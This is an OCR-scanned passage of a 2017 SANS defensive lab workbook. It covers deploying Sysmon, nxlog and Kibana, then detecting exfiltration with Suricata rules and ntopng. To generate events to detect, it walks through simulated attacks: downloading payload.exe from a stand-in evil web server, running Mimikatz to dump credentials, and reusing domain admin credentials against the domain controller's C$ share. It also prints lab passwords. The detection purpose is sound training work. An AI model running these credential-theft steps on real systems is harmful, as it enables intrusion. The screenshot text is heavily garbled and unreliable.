MOO\lledl.r IA.OOT\ \module:, CacheD>: \ ROOT\\d4C4 P1dHlo lllOOT\\dato\nxlog.p1d SpoolDu \ROOT\\c!Aea Logf'1le- I ROOT~\dac.a\nal.oO .109

<?:x-t.e.r..1.on ... so~> Module xa ).son
</!Jn:en.u.on> -

<Iap-.1c eve.nt:109>

?i'..odw.!e

U&_u..,. 1.,ta..:09

Sa·e.Pos ttUE

<Q-J.eri"L1.at>\

<Query Id··o·>\

<Select Path··Ac:pl1cot.1.on">· </Seleoc>\

<Select. Peeh·"5y·ce:m· >· </Select.>\

<~lecc Pa-ch··.s~cu:-.1cy·>· </S~lr:cc>\

<~lee: Pat.h··"f.1crcsort-lf1!'\dov·-S~·.aa:c.=.\~r&tlo.:ut.l·>·</5ele:cc>\

</~ery>\ </QUerviuc>

t.x ec co_]aonl>:

</Inpac>

<Ou.t.p\lt. O~t.> MOOule

°"' tcp

5. Open WinSCP &amp; copy logstash-nxlog.conf
Before we configure our hosts to start generating & forwarding Windows events to our ELK stack, let's make sure Logstash is configured to correctly parse incoming logs. We have already prepared a logstash-nxlog.conf file, which you can find on the Desktop of the domain controller.

Feel free to analyze the file (e.g. by opening with Notepad++), but its key features include:
o It will use a standard JSON parser o It will start a TCP listener on port 5000 o It will use Elasticsearch as out put Once you have analyzed the file, let's copy it to our ELK system: o Open WinSCP (you can find it on the Desktop) o Connect to "192.168.30.16"

· Username: sec599
.......
· Password: sec599

o Ignore the certificate warning and click "Yes" o Configure remote directory to the right to be "/tmp" o Configure local directory to the left to "Desktop" o Copy logstash-nxlog.conf to "/tmp" (drag and drop) Once the transfer is finished, feel free to close WinSCP.

206

© 2017 Erik Van Buggenhout & Stephen Sims

p

local M.,~ F~ Con'lrNnds S<ssion Optooru Remote Help

83

. g,; .

ljj ·«S999192.168.J0.16 Qt No, S.S...,.,

·Oesklop
.jl Uplold ·

Ill · ·
j Edit · )( ~ Propert,,s
s.tt lype

r,: , G) ,1' 'i'o

Imp

; ; l Changed

N·m·

· Cl!l · ·

Rl GJ G) ,1' [!;). Fond Files 'i'c,
rs lttW · +1 ~

Sue Changed

Rights

1 ICB 835 0
21C8 18,698 KB
1 ICB

p.,tnld1tt<to,y CONF File Fie EXE Shortcut Apphuhon Conf,gumian ..ti..

911"'2017 2:18:16PM 9f1~17 1:41:09PM 9'14/2017 l:U5' PM 9/1"'2017 7:C6:0U,M 9/1412017 2:18:16 PM 9/lol/2017 2:18:37 PM
-

· · hspe,fdffli_-..,.,_ , , _- 1985354563 s y n u n d · p n v o t. .931&.· syrtcmd-pm,lle·93f8... syst,mc1-pnvote·9318.. sy,:temd-pnvot. .9 l l L
I1 sy,:lemd·pnll>(..9_3_fL _ _

7/27/2017 &U:17 AM 9/14/2017 1:Jol:56 PM
9/l"'2017 l:J.t59 PM if1.4/20171:J.t55 PM 9/14(2017 1:34:55 PM 9/14/2017 1-3-1:55 PM 9/14/2017 Ut55 PM
9/1"'20171:l-l:5' PM

l'Wlr-v-x
rwxr·llT·X
rw»·>r··
rw11··- · ·
,-. ·····
IWll·-···
,..,....... -··-··

IUplo·d 1.-,...dtie""9&lwl..-.....i,a,nf I D -chculry:

X

6658 of 19.0MB., 1of 5

Or,......~(.a<IIIID_,..,.._,

1,..,.,...1:119.. f,r

CIC

J c,----------~~-------,

I hiddon 0Baf0 Bin0ot7

s hide!

6. SSH to 192.168.30.16 and configure Logstash
Next up, we will open Putty (from the Desktop) and connect to 192.168.30.16 (by now you should remember how to use the Putty interface). You can use the same credentials (sec599 - sec599). Upon establishing the session, we can su into root (the root password is "sec599").

,,..

sec599@ubuntu03:~$ su root

Upon obtaining a root shell, please run the following commands to move the logstash-nxlog.conf file to the right directory and to restart logstash:

root@ubuntu03:/home/sec599# mv /tmp/logstash-nxlog.conf /etc/logstash / conf.d/logstash-nxlog.conf root@ubuntu03:/home/sec599# service logstash restart root@ubuntu03:/home/sec599# service logstash status

Once you have confirmed logstash is running, feel free to close the Putty window.

© 2017 Erik Van Buggenhout & Stephen Sims

207

/ II roalOubuntu03: / homc/sec599

· X

7. Open Group Management Policy Now that all configuration files have been prepared, let's start deploying our solution to the domain environment!
We can open the "Group Policy Management" menu from the Server Manager (which is started automatically upon logon, if you can't find it press the Windows start button and type "Server Manager"). You can click Tools, after which you can select "Group Policy Management".
As we've done before, we wil drill down to the following location: o Forest: synctechlabs.com o Domains o synctechlabs.com o Right-click the Default Domain Policy and select "Edit..."

208

© 2017 Erik Van Buggenhout & Stephen Sims

_ OC'f1ult Oo1N1n Pohcy (OC.SYNI

0.,..,. Domain Policy (OC~TECHlA8S.COM} Policy~ - - - - - - - - - -

Computer Configuration

Poli<ies

Sel«t 1n ttrm to view its description. Nam~

Pmeffll<H

L Computer Confi9ur1tion

v f lker Configuration

lkrr Configuration

Pohc,es

> Pmerences

_ _ _ _ _ _ _ _> &.ttt1d~
8. Open Startup Scripts
We will now add the sysmon.bat and nxlog.bat files as startup scripts for all hosts in the domain. Within the Group Policy Management Editor, we will drill down to the following location:
o Computer Configuration o Policies o Windows Settings o Scripts (Startup/Shutdown) o Startup (Right-click-> Properties)

© 2017 Erik Van Buggenhout & Stephen Sims

209

.J

[J

Fil· A<llon View H·lp

_ D·hult Oormun Polley (DC.SYN - - - Scnpts -(Su - - - - ftup/Shut~) -_ ----~----_-_::_:_:-~_-_-_-_-_-_-_-~_'-_-_-'~~-·_:::-~__j7

v Comput,r Conf19ur,t1on

Polte1ts

St.ortup

N·mt

Softw··· Sfflin9,
Windows Sdtlng·

Slirtup Shutdown

Name R=lut,on Oecnption:

-

Sct,p11 (Stortup/S Contains computer sta St11tup Propert,n

X

> .._ O~Pnnt..-

, ~ Security Sdtlngs

,mi Polley-based Qo!
Adm1n1st11t,ve Temp

-·-

I Use, Conf19ur,t1on Pohc,os Preferencts

<
OK
9. Add Sysmon &amp; NXLog startup scripts
Click "Add...". We will now reference the sysmon.bat file t hat is hosted on the SYSVOL share of the Domain Controller as the script name:
o \ \DC\sysvol\synctechlabs.com\Sysmon\sysmon. bat Afterwards, repeat the step and also add the nxlog.bat script:
o \ \DC\sysvol\synctechlabs.com\nxlog\nxlog .bat
You should now have two entries in the "Startup" configuration. Once added, please click "OK"and click "OK" again to confirm the Startup configuration.

210

© 2017 Erik Van Buggenhout & Stephen Sims

I

M

or

File Action View Hdp

.. ·

_, 6 Startup Prope-rt,c- s ~ - - - - - - - - --7

_J Def1ult Domain Policy [DC.SYN
v Computer Configuration v Poliocs
Software Settings v ..,. Windows ~ ngs
Name ResolUIJo'l - Scnpts (Startup~
ii I > 119 Deployftf Pnnten
> SecurotySettings
... Pohcy-b..-1 Qo~ Admmrstratn,e Temp .... Prderences v J User Configuration Policies
> Prderences

~

To viewlhe ICl1)l fies llored In1hs Got.., Policy Oti,ec:1. pr-. lhe bulon below

7 u

OK
r
< _ _ _ _ _ _ _> \ Extended.,,(Standard/

Cancel

10. Reboot Windows workstation
Let's test our startup script by rebooting the Windows workstation. Switch to the Windows workstation and click the "Poweroff" icon and "Restart" button.

Nick Fury

A Nock fury A ' :1,... ,,....,

Shut down
Restan
i:t-r:-a:ri ,'~-1...'_ C)

11. Authenticate to Windows workstation Once the workstation has restarted, feel free to authenticate using the following

© 2017 Erik Van Buggenhout & Stephen Sims

21 1

credentials: o Username: nick.fury o Password: Awesomesauce123

12. Launch Chrome &amp; open Kibana We will now open Google Chrome (shortcut in Task Bar) and open the Kibana bookmark. Note that you may receive an SSL certificate error, which you can accept. The credentials for Kibana are:
o Username: admin
o Password: sec599
Upon loading, Kibana should present you with a page asking you to create an Index Pattern. The Index pattern that is to be configured has the following fields:
o Index name or pattern: "logstash-*"
o Time Filter field name: "@timestamp"
Once you have validated these fields, please scroll down and select "Create". Upon clicking "Create", you will be redirected to the Management page, where you can see all available fields in the I ndex. You might recognize some fieldnames that are part of the Windows event logs we are forwarding!

)(

f-

C .A. N~11-cure ~ ..J/19l.168.30.16 app/1:o.aN· m~MI/, bat1a 11\C-!'t g·

'< ~ ffi<nse f«w.U

Cuckoo Sa<!Obor [') Sampln · tv,-., [I ~ - 0 NMW· W MISP

CTf

9

0

X

., *

t=
:Pliio~·4't .no~· ~t:-ern.You mvn se-.m Of tritf1f Of'e
tOCOl'ltmut>

Configure an index pattern
In order to use KIbona you must configure al le~s1 one index panem. Index pattern< are used 10 ldeouty ~ fl4st1csea,ch index to run search 4nd ana!ytl(s a~JillSL They are a1so used 10 confJgu·e ~rid<
Index n.tme or iuittern
Iogstash-·

Time Filter field name O
@tlmes1amp

Vt:,:,, lh~OODOl"I ff' c-«ect se...-tht1, ·PIM"t &riy tu,,e-bes.t'd ,l"'de.· o~t:,n tn.t:.. cont.air.s · ~ ! ' d wlll ·u:Om.t:1G1~ oe t.<t~ndeo -:o qve,y Ol'\fy tftt ino ces :f'I.: C04"'>t··" CS.ta wii;.n,ri :ht C\lrttf\tJy stlKtied um~""'' Se-1"Cl't t"J i&Ja ns.t t~e tflide.x p,,t:e"" lci~t.,sfl-· Ml. ~l>t q.,,:ery EHOCM:ard'I for°"" sp-e,c-,'" c ~:ct, I'll "'; .:~s te I
1opu,,,..zo,s.11..n1t1-r.~""""'""·a.,,.-.c_,.,.,~
Vi '!:"I rea:r-.: ('n·--10 to Et&>tiCH..-c.t'\ ~ oe,:,on ;t-oukt !""O io,--au be necen«y·--.d wt:: &ill.Hy~ re,o,o,ll!'O L"' ·.,.0.1 e '.-ef'$0"'5o",wr..
use even1 times 10 creJte index narnes [DEPRECATED)

13. Validate data in Discover
Next, click the 11Discover11 tab, where you will see events coming in from the Windows workstation. Feel free to search for "Sysmon11 in the search field and see what is coming back and you should see a number of Sysmon events that are being generated.

212

© 2017 Erik Van Buggenhout & Stephen Sims

This confirms we have successfully implemented Sysmon and logs are being forwarded using nxlog!

e

· X

X

f-

- * C A NotS<!C\Jre ~ 192.168.30.16 ,p~, b&""" /dts-'"O\·« _g= ,..,_. ,oltim= ""'r<~,· ,, ,.,k>gst.;sh· ' 'ontervatat.to,query:(que ·· 'f

~ PIS<n"' f,n,wo,. '(' Cudtoo Son<lba> D s.,..,p1,. - Ev,1-t,,.

I kibana

313 hll~ Sysmon

[J l<.d>an·

"'"""' It MIS!'

CTF

Ne.-. save Open Stwe < 0 La<t 15minute< >

i '\~>---~~.:~-,?~~ Add~f· er·

.. +

-

·

..

0

Selected Fiel~

Avai.able Fields 0
0 " t,me>t...

sep1embe· 15th 2017. 05:49:16.452 · 5e;)tember 15th 2017. 06:Q4:16.A52- Auto
.I --·· --- --

· Aaoum ..
t Comm6/'.·
l Crt1-eoon...

Time

_,our«

/Op~at, ono1

SoQrc~: "!.icrosoft.·~ndows--

t-,k: 3

K ~ s : -9,223,312,036,SS.,,775.804 C..l~1,ory; ~e

twork conn.ect1on d~t:ttte:d ( rule:: ,e:tilooi-kConne:ct)

Uur: SY~TLCttL.ASS"\rrick. f\l,.Y h~rltl)1)4!': l\$0

· Septei'!lt>er 15th 2017. OS:Si':S3.000 ~ - . M

14. Import searches, visualizations &amp; dashboards Next, we will import a number of searches, visualizations & dashboards that the course author has already prepared. The results of all of this effort are 2 searches, a bunch of visualizations and, most importantly, 2 main dashboards:
o Overall Windows events
o Sysmon You can import this by opening the "Management" tab-> "Saved Objects" and clicking "Import". In the explorer Window that pops up, select the "Sysmon+Winevents.json" file from the "Desktop\Windows events\" directory.

Upon selecting the right file, please also confirm we want to overwrite any existing objects by selecting "Yes, overwrite all".

© 2017 Erik Van Buggenhout & Stephen Sims

213

[I iuboN

X

~

C A Ne· se<Ur@ ~ 192.168.30.16 app 1baN<' ~ r r ~ tml4 ob _g o&-· (Ut':d.!mboa,d!

S-0..S···-- f8 - F · - '< C...-Sa.·-· D

[I ~,\,.... .......... · MJSP C'lF

e
' *

( kibana

.,.

rr

Obj E.K

,._., It QuackICCtU
· o..ictop ,

riling ,uttt,W,nd-, ..,,..,..

p X ~-

CJ O

.t, lmpor

1'1" mo,;,fi<d , 201 ·nAM

l\lc-d obJem. TyJ)4cally

1,pc

tead of this screen.

JSONr. .

0oc:umc.'1ll "

El)(

PrMl<g< hol.c, · V,dt:o,

c,nut
15. Browse imported dashboards After successful import, please take some time to review the dashboards. Some of the interesting visualizations we added include: o An overview of most popular Windows event I Ds (Overall dashboard) o Hostnames and port numbers for outbound network connectivity (Sysmon dashboard) o Command line arguments used upon process creation (Sysmon dashboard)
0
In an enterprise environment, these dashboards can be further adapted to your needs. For our labs, they serve as a solid basis!

214

© 2017 Erik Van Buggenhout & Stephen Sims

ll D·s·ooo,d S,,,mon - ~ ><

~

C A ~<>ts~u·· ~ 192.168.30.16 1ppt,,ti.na· /dashbollrd/Ot,<68«0-99e1 1

~ - ms ,o '<° Cweb:>-, "I S..~p,os- EriMl>w (J o,.,,.

e
,3< t 2f2tc~S2ab7_g·0t< a·(descnp!;OR: IL CTf

· X
*'I'

( kibana

No results found

Oestln111lonHostname.keyword: OescendlnJ ptsen-:t.1argNorg.org

Count

Dest,natlonPort.keyword Count Descendlni

3128

4

Vlswl&Za on Sysnon :n;ige

.· ~.rJon ysmon -Parent ma e

. .

lmaJt,.keyword: De1cendln1
C:IProgram Files (x86l\GOogl e1Chrome\Appllc.111on1Chrom C:\Pro£!'am
F1~WlndOMAppS\Microsoft.Wndowsl't1CXos_2.017.JSOI
C:\ W1ndows\System321-,.~1wm,PrvSE.exe

16. Example 1: Download a payload from a website
As a first example attack step, we will download "payload.exe" from our www.evilwebserver.com. You can achieve this by opening Google Chrome, surfing to the www.evilwebserver.com bookmark and downloading payload.exe (if Chrome complains, please click "Keep").

D lnou ol/wnp,~·

x

~

C (I) wwwe,,,l.....,._.com lsamples/

f8 - ~ ·w.,-.. '<" C..c"-"" s..,dbo· 0 s-p... [.-i,.. CJ lrlboM

CTF

Index of /samples

Lu, modtfird Siu Dtscnpno·

~Pwm Dlfcs120
[2) @Yl@ddll
~ P1Yloadru
(11 p;gyloadJ1t1

2017-08- 11 15 39 5.0K
r 1017-0S-11 15 72K
201'-0S-11 15 JS ' 1K

[ll ~ [ll payload pd
[il Rl) lpadKl

10P-OS- 11 15P 0 2017-08-1115393JK l017-09-0)10 l9 l"9

oayload , bs

2017-0S ,111538 - 1K

~ PAYioad mkcuon pd 2017-0S ,11 1:)40 2 SK

e

· X

* :

Show.a X

17. Example 2: Dump credentials from memory Imagine that our attacker has already been able to identify local administrator

© 2017 Erik Van Buggenhout & Stephen Sims

215

credentials and will now use these to further move laterally inside the network. We will simulate this behavior by doing the following:
o Open a command prompt (Right-click-> "Run as Administrator") o Provide the following credentials
· Username: .\student-localadmin
· Password: sec599
o Change directory to "C:\Users\nick.fury\Desktop\Mimikatz\x64" o Run the following command to dump credentials from memory:
· Mimikatz.exe privilege: :debug sekurlsa: :logonPasswords

18. Example 3: Reuse Domain Admin credentials As a final example attack step, we will reuse our stolen domain admin credentials to authenticate to the administrative share "C$" on the domain controller (e.g. because we want to steal the NTDS.dit file, where the domain hashes are stored).
You can do this by: o Opening a Windows explorer o Browsing the following path: "\\dc.synctechlabs.com\c$" o In the request for credentials, provide the following information:
· Username: Administrator · Password: Sec599

216

© 2017 Erik Van Buggenhout & Stephen Sims

Home Share View

~

· 1- · NetWOllc · DC

.., X ~nhDC

Quick access
· Desktop

netlogon
"~--

sysvol

Downloads ...;,1 Documents ... Pictures

,,,r ,,

Windows Se<unty
Enter network credentials

X

ELK

Enter your credentials to connect to: De

J Mus,c
Prrvil~e Escalation

·

· Viclfl>s

IAd ministrator
(;_....'

I
Ilo'

& Ond>nve

C, This PC Network

Domain: SYNCTECHLABS
D Remember my credentials

Access is denied.

OK

Cancel

·
v@
p

Zrtems
19. Detect malicious activity in Kibana Finally, we will now attempt to detect all three malicious examples in our Kibana dashboards. Based on what you've learned in the course, we'd like you to spend some time by yourself to try spotting the activities.
We can however give you some clues: o The downloaded file can be detected in the "TargetFilename" visualizaton in the Sysmon dashboard; o The running of Mimikatz can be observed in the "Commandline" visualization in the Sysmon dashboard; o The reuse of the domain admin credentials can be observed as an "EventID" 4648 (Login using explicit credentials) in the Overall dashboard.
Should you fail to identify the activities, please don't hesitate to reach out to an Instructor or TA for additional guidance.

© 2017 Erik Van Buggenhout & Stephen Sims

217

This page intentionally left blank.

218

© 2017 Erik Van Buggenhout & Stephen Sims

SECS99-5.1: Exercise - Detecting data exfiltration using Suricata
Objective
As part of the lab, the following data exfiltration methods will be discussed: · Credit card information that is sent out in clear-text; · Confidential data that is mailed to recipients outside of the organisation; · Volume-based analysis for exfiltrated data.
Scenario Virtual Machines
1. SEC599-C01 - DomainController 2. SEC599-C01 - Firewall ,... 3. SEC599-C01 - Windows 4. SEC599-C01 - Kali 5. SEC599-C01 - Ubuntu0l
Exercise 1 : SECS99-S.1
The objective of the lab is to detect data exfiltration taking place in our environment. As data exfiltration is a tricky subject, we will illustrate different methods to try detecting exfi ltration.
As part of the lab, the following data exfiltration methods will be discussed:
· Credit card information that is sent out in clear-text; · Confidential data that is mailed to recipients outside of the organisation; · Volume-based analysis for exfiltrated data.
1. Log on to Windows workstation Log on to the Windows machine with your normal user credentials:
Username: nick.fury Password: Awesomesauce123
2. Logon to pfSense First of all, we are going to log on to our PfSense firewall, which is positioned at the perimeter of our network. You can open the management interface by opening Google Chrome and clicking on the PfSense firewall bookmark. The credentials are:
Username: admin Password: sec599

© 2017 Erik Van Buggenhout & Stephen Sims

219

C A No11«u·~ ~ ., 192.168.10.1

~.-..,

MISP

8

· X

a. ·

Status / Dashboard

-System lnlormat,on otSffll· ~ t;raa com. ~~~ vvn..J.Jt-t,.:~

,I- 0 0

~"iC 0dlSft1·9t·1 11t7 ~ ·00155dOtaOO<I

P..!10'1· ~,.., ,, tO fd76fdd9tft4S8821.11t

9IOS

· ~ r ~ ~·vtna Inc

''~'°'0t0006,

PdURo..t· 0§1Z3i20U

2) 4 A{\(AS( p1 ·A""'~
s:: ~1,; :- Of' ~flJ.J1.! 1.4 '43Ct,T 101"' «..e~ 10 HELEASt1>19

P\tdon.
CPU r-,-

P~~·
tnte{tP, A'f!-MlA1 CPU£5 :is.ti.,, c,:. 30GHz
:.C~1 1Pi(·tQt"$J1:!C,)'"'I

...Interlaces +
.t, ,.,. +
... ,Leu~ 0
.t. · -

lOOw'l'-·"~··
.....1~t,f$f' · ~~~,C)
·V..,.c,1,......... , , ~··

+o
/- 0 0 ,921611 ,,2 t69101 1il 1'9:-01 19!': 161JO 1

OHS Hf¥ffltl
La<·--

· 2".' t;'Q,
· 0 9'151
u

3. Configuring Suricata on pfSense
You can open the Suricata configuration by clicking "Services" -> Suricata. You may
remember we also used Suricata in the Cuckoo sandbox that we created on Day 2. We will now however configure Suricata in a different way: by using pfSense's builtin Suricata package.

The first page you'll see is an overview of the interfaces on which Suricata has been configured. You'll notice that we've already added the WANNOI NTERNET interface. To give you a bit of background: this is the "simulated" WAN we are using in which our evil Kali machine (hosted on www.evilwebserver.com) is sitting. This is the host to which we w ill exfiltrate sensitive data!

~-f-- ',( ~

C A No· sKure ~ .;;.,/192.168.10.1 .sunca·a/sir..:mi "'l~<ntez.php

f6'

C..ckooSo,,cloo, D S.-,,p<os [ - I]""'""" "'""" .. MISP

CTF

·F.. .S' en'

e ~

Services / Suncata / lmerfaces

e

D X

·
0

IP.-n Interface SeHlnga Overview

--e C®

-
0,SAaUI)

0

4. Scenario 1 - Credit card data

220

© 2017 Erik Van Buggenhout & Stephen Sims

As a first scenario in this lab, we are going to attempt detection of credit card information being exfiltrated using an insecure web form. Suricata has a few rules that can help us detect this type of information, but they are known to be rather prone to false positives and false negatives. We will write our own rule!
In the Suricata main configuration page, please click on the "Edit" icon (on t he right) for the WANNOINTERNET interface in the overall Suricata configuration page. This should open a submenu with a number of "WANNO ..." items (e.g. WANNO Settings, WANNO Categories,...).
As a next step, we will click the "WANNO Rules" button in Suricata, which is used to manage the rulesets applied to Suricata. In the dropdown box "Category", we will select "custom. ruleset".
In the empty window below, we will write our new rule:
alert ip any any-> any any (msg:"ET POLICY Credit Card Number Detected in Clear
(16 digit)"; pcre:"/(?: /\ I[A\da-f])((6011 l622\dl64[4-9]\dl65\d{2}15[1-5]\d{2} 14 \d{3}I3\d{3})[\- ]?\d{4}[\- ]?\d{2}[\- ]?\d{2}[\- J?\d{4})(?: [ /\\da-f] I$)/i";
reference: url,www.beachnet.com/~hstiles/cardtype.html;classtype:policy-violation; sid:300005; rev:1;)
The rule reviews all ip traffic (any to any), and looks for a PCRE regular expression that matches 16-digit credit card numbers. Please use the copy / paste function in LOOS to copy this rule. Once the rule is entered, please click the "Save" button at the bottom of the page.

~

C A Noi.ecure ~ 192.168.10.11 uroW unata rulc;.php

f6> ~.. ,.,. · '< C.i<to,:, Sandao, l:l s...p~. (.a...bw I] -

Nessus

t;IISI'

CTF

-F_.s,..en. e..

-

-

·

Sunc ata / Interfac e WANNOINTERNEl / Rules custom rules

0

p u,.,,

Avall1bl1 Rulo Callgorlos

5. Scenario 1 - Submit CC information
Let's test our rule! We will use the scenario of someone submitting their credit card information in a clear-text HTTP connection ... You can find a credit card submission

© 2017 Erik Van Buggenhout & Stephen Sims

221

page at www.evilwebserver.com/creditcards.html.

You can get creative with most of the fields, but please do make sure you use the following, sample, valid credit card number:

4012-8888-8888-1881

Billia1 laformalioa (nquind) fir,t :-.amc Erik Lut :-;amc V,n Buggenhout
Compan,· (oprional) NVISO Sirttt Addceu pan,,. Smte~Gudule ,r,
Stttei Addte.s (1) Crty Bruue1s
State Plo,,ncc B1ut1el5 Z,p Pootal Code 1000
Ccwur)· ~ Phone 00233214S52

C.-.dil Card (~uiNd)

Credtt Card.012-U88-3888 ,IS8l '\umbtt

Expuy Date. April o-ij

· 2015 ·

Adclitioul IJ,foraurioa Contoct Ema~ ···nbuggenhovt@nv.so be

Special ;\01es oh no, ~h· card h expired II
j

Send Sewro f0<m »

0

D X

*

6. Scenario 1 - Review Alerts in PfSense
Upon submission of the credit card data, go back to pfSense -> Services->
Suricata and open the Alerts page. You should see one alert that was triggered due to the submission of the credit card number (see screenshot).

222

© 2017 Erik Van Buggenhout & Stephen Sims

~

C A Notsecu~ blt;lS' ;J,192.168.10.1 ;u icaw»ri:a·a_J~": php

'fl PfSe- F-.re,,a1 I(' Cuckoo S-bo..

Services I suricata I Alerts

e

· X

f)

Pll.sa

Alert Log view Settings

frt&UnutoVtf:'W

l/tA.l\"-0 NlE.RNCTl I/A~ htlOff Vllfbcn tl'ISWlff a tfl:1JOU'NIM. IO 11'\tt>t'Ct

CII

........... Elm
~.. r...t~t'"~ri erc~ 1,c,·1 n11s
Alert Log V1·w Filter

....,,C:-t'0f·~ttoO>~4'1 Dt'f..,,._lt 250
O

Loll 250 Alen Entrioc (Mo11 reconl entuos ar11 hstad frrst)

Doto

Pn

09115.ion 1 'HiS<J S6

Prolll TCP

Class
Portfl"1..iCotoot.11tePrnKJ ",o+et-o,,

10 10.10 1 21~18
Q@

DPon
,s 0 ,o O till
Q !B

CtO ·SlO Dacnpdon

300005 CT POUCV Credit Card~· De'\ecttd""Cita·

EB )(

'16G,g1tj

7. Scenario 2 - Detecting classified documents
So far for credit card numbers... Let's assume another example! This time, we will analyze how we can detect a classified document that is being leaked using e-mail. We will again develop a Suricata rule for this!
Please take the following steps again: o Open the Suricata main menu in pfSense (Services -> Suricata); o Click the pencil icon to edit the WANNOINTERNET interface;
o Click the "WANNO Rules" submenu o Select the "custom.rules" category in the "Category" dropdown box.
You will notice that the credit card rule you just created is still there. We will now add a rule to match confidentiality labels. Please copy paste the following entry below the existing one and save the form :
alert tcp $HOME_NET any-> $EXTERNAL_NET 25 (msg:"ET CUSTOM - Confidential in mail"; flow:to_server,established; content: "Q09ORklERUSUSUFM"; classtype:policy-violation; sid:3000002; rev:5; metadata:created_at 2017_09_15;)
Note that this rule will: o Match on any outbound TCP traffic to port 25 (so typically outgoing mails) o Looks for the content "Q09ORklERUSUSUFM", which is a Base64 encoding of the string "CONFIDENTIAL". This is because attachments in e-mails are typically base64 encoded ...

© 2017 Erik Van Buggenhout & Stephen Sims

223

~

C A Not s«ur~ ~ 192.168.10.1 · mcaLlfsunc,··-

",>

Cl9 P!Set>U r,,_a,1 V: Cudcoo S..oclbox e) S.mpl0< · Ewwebs· (J l(.ibona

N· ssus -, MISI>

CTF

'0. .:.~~-11 ~ . .

.

Suricata / Interface WANNOINTERNET/ Rules· custom rules

8

D

e. *

. .

·

0

Available Rule Categories

C.lf90l'Y

:ustvrn.11.ato z "'<;tU'.e'Ul~Cd',e,QOf'l't..Ow:tr lffil.'IIT"~

Defined Cua1om Rules

altr-t 10.;-;;,-,-;;;/ l"'J i~,··£· "OU('Y er-Nit car~,.,,...-«.. Detntfd '" ClHr (1' dlSU:1·; ;-tl"t':·,o-··tt \di · j 01 ·J..-: ;.,'-" s.-O!'f'..,.i:r at1-1 ·> !F~Tfit",-.....~,;- 15- tV.1:"'t .. c~ro,., . C0t1tb:~t,t!·1 1n ~11·, ,lCM ~..'>t'"v~r,~sutll,.1'1'"::, ,cnt:tr ·

8. Scenario 2 - Sending a confidential mail We will now simulate confidential data that is being sent out in an e-mail. Let's open up Thunderbird (it's on the Desktop) and do the following:
o Click the "Write" button to draft a mail message
o To: "jim.persons@feistymail.com"
o Subject: "For your eyes only"
o Attach a file: "Information.bet", which is located on the desktop
See the screenshot for an overview of what the mail should look like and the contents of the Information.bet file. Once the mail is ready, feel free to send it out by pressing the "Send" button.

224

© 2017 Erik Van Buggenhout & Stephen Sims

" fol )'OUI =< on~

F11

it.

3:( Send  Spelhng · " Atl.Kh ·

Q Secunty ·

~ S- ·

Fcom: Ntdc fury <,obsO>yn<tKhlabs.com> prmwsyr,aar.uun.ccm To; 1·m.ptf\OnsC/ffltym1ol.com To:

(J lnformatlon.txt

S.,bJ<Ct. Foryou, ~ only

P1i.graph

V1n1bl~ Widtt,

,...._
lnfo1m1t,on,txt - Nottj:,1d

0 '~

File Edit fonNt VoM H<lp
~~~~~~=~-~=~~-~~=~-~~=~~~~~~~~~-~~~-~~-~~~~~~-~~~~ 1
- It appears SOC'lle of our partners are starting to realize Synctechlab's wor -Ron forgot to bring the cake yesterday, revenge 1s i11Per~tive!

9. Scenario 2 - Review Alerts in pfSense
Upon sending of the mail, go back to pfSense -> Services -> Suricata and open the Alerts page. You should see another alert that was triggered due to the sending of the mail with confidential information (see screenshot).

C A Nor s«ure :,,,,:"' 192.168.IO.llsuncata/suncat1_al"'1Lphp?1muncuO m
-F~~S-en' e..
Servrces I Suricata / Alerts

e

·

e. *

.

0

f> UtU

Alert Log V11w Setting·

Swe · fkmov· I oOI

CW"-""°'--.r."U<fff, WAI<
0ooN .-flCtl ~ ·Jcm ,via fl1'11 ID 4'11HN'-,,1
rs:::,

Afer1 Log View f=1lter

O

l·st 2~0 Alert Entt,e1 (Most ,ecenl entri·· are hated fust)

09115..2017 '

°"""
:s OHl 1 %U,J.S "'1 lS

19.35:01

Q. IB

Q. 8

Gll).$1)

-

1Xl00002 [tCUS'TOM CO~!-."T~Lnmat·e.ctin,~
Sx

10. Scenario 3 - Analyzing traffic stats using ntopng

© ? ()17 Frik \/;:m R11nn,:,nhn11t R. St,:,nhPn Sim~

? ?!'i

Finally, we have also installed "ntopng" on our pfSense firewall, which is a package that supports a wide variety of network diagnostics & monitoring. A highly interesting feature is "NetFlow" support, which we can use to spot outliers that generate high amounts of volume.
You can configure ntopng by opening the pfSense main interface and selecting
"Diagnostics" -> "ntopng settings". In the settings screen we will configure the
following fields: o Enable ntopng (click checkbox) o ntopng Admin Password: "sec599"
o Confirm ntopng Admin Password: "sec599" o Interface: LAN and WANNOINTERNET
· Note: we want to investigate traffic coming from our LAN to the evil web server in the WANNOINTERNET zone
o Mode: "Consider only LAN interface local" Once configured, scroll down and click "Save".

Ggnar· I Op11ons

Ke+p0.1a/Sen.1t191

,, ~moon9~1~ 91.ohl · Nl:,a ff>cd.-ata Hott: tt. . . .eel eD .etltltOS Nd Ml· will be -.ipea Of'I p,tekq e ~rt'lllt:tASltupot. . .

eonnrm n10QnQ Adrnln Pauwotd
lntt.ffau:

UDNMZ-~- - - - - - - ~
csoc
WA~~OINTEl>NCT- - - - - ~ - -

ONSMock

~~Stl!Jpon,eaMld tS01'te N)(:41n,(;ifT'lff1C"lt--.,Of1tJ (:::~·.su· · Cct,f'IOl,lrHhowNffit' ~~ II I\Md,.f',j

Loc· I Networks

Mode

Ccns.otlO,NJLA--.il'l'~6(:etocdl
Cotl~!ihcW~lf~~illt-:C~ r...-t. 't Cclntsc:· · ·R f'10"' ~,«"Ot..slOCa

11. Scenario 3 - Open ntopng interface
Now that we have configured ntopng, we will open its interface to start monitoring traffic. You can do so by opening the following link in pfSense: "Diagnostics" -> "ntopng".

In the login page, enter the following credentials: o Username: admin o Password: sec599

226

© 2017 Erik Van Buggenhout & Stephen Sims

~

C A N<.>1 $e<:1Jre ~ l !92.168.10.1 ~uuu7reffie<=/

'8 ~ r~...,. ' ( CldooSoNlbca D So,nc,IH · E . ~ CJ IGbono ,-.....,,

-Welcome to ntopng

$· r'·°~ " " " ~~'~in~i.~nt;. '_t e.,t_, O .~N_o,.-,t , a
~d'-..._...,,,..,..tlfh:l.ooqecr~,...

,....

..a,-.~,o .._,w,g
'-»'9 ·......,.,,,. 0P'l.d

8

D

* 0.

--

12. Scenario 3 - Open hosts interface

Upon authenticating, you will land on a page that is automatically refreshed every 5

seconds. An interesting view is the "Local Hosts Active Flows Matrix", which you can

open through: "Hosts" - > "Local Flow Matrix".

C A Mots«1Jre I»'!':!.".'; 192.168.10.1 JOO/h:J~ts_ff\Jtnx.ka

* 0,

1:-:111 __._ jlt- RMI

0 · .Ii · Q S- "°"

